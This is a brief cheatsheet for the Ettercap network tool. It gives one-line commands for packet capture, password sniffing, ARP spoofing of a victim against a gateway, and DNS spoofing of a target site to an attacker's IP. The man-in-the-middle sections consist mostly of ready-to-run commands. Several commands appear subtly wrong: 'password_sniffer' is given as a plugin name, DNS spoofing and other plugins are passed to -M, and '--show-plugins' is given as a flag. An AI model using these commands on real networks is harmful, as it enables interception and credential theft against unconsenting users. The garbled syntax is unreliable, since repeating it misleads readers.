# Ettercap Cheatsheet

Ettercap is a network security tool that allows users to monitor and analyze network traffic, as well as perform man-in-the-middle attacks. This cheatsheet provides a quick reference guide for using Ettercap.

## Installation

Ettercap can be installed on Linux-based operating systems using the following command:

```bash
sudo apt-get install ettercap-graphical
```

## Starting Ettercap

Ettercap can be started with the following command:

```bash
sudo ettercap -G
```

## Capturing Packets

To capture packets on a specific network interface, use the following command:

```bash
sudo ettercap -T <interface>
```

## Sniffing Passwords

To sniff passwords on a network, use the following command:

```bash
sudo ettercap -T -P password_sniffer -i <interface>
```

## ARP Spoofing

To perform ARP spoofing on a network, use the following command:

```bash
sudo ettercap -T -M arp:remote /<gateway ip>// /<victim ip>//
```

## DNS Spoofing

To perform DNS spoofing on a network, use the following command:

```bash
sudo ettercap -T -M dns_spoof /<target site>// /<ip address of attacker>//
```

## Plugins

Ettercap has various plugins that can be used to extend its functionality. To view the available plugins, use the following command:

```bash
ettercap --show-plugins
```

To use a specific plugin, use the following command:

```bash
sudo ettercap -T -M <plugin_name> /<gateway ip>// /<victim ip>//
```

## Additional Resources

- [Official Ettercap Website](https://ettercap.github.io/ettercap/)
- [Ettercap User Manual](https://ettercap.github.io/ettercap/downloads/EttercapUserManual.pdf)
- [Ettercap Wiki](https://github.com/Ettercap/ettercap/wiki)
